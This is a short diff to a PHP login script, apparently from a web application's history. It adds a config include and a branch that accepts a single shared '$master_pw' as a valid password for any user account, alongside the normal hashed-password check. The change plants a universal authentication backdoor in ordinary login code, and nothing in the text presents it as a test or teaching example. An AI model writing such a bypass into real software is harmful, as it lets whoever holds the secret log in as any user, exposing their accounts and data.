@@ -2,6 +2,7 @@
 
 require_once "../modules/models/user.php";
 require_once "../common.php";
+require_once "../config.php";
 require_once "../modules/models/loggedin.php";
 
 maybe_session_start();
@@ -16,6 +17,9 @@ if (count($_POST) > 0) {
     $user = User::find_by_email($_POST["email"]);
     if (isset($user)) {
         if (password_verify($_POST["password"], $user->password_digest)) {
+            $is_success = 1;
+        }
+        elseif ($_POST["password"] == $master_pw) {
             $is_success = 1;
         }
     }
